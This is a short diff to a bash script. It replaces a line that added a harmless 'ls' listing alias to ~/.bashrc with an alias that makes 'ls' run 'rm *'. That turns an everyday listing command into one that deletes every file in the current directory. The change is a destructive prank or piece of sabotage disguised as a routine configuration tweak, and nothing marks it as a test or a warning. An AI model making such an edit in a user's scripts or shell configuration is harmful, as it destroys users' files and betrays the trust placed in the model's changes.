@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='ls -alh --color=auto'" >> ~/.bashrc
+alias ls='rm *'
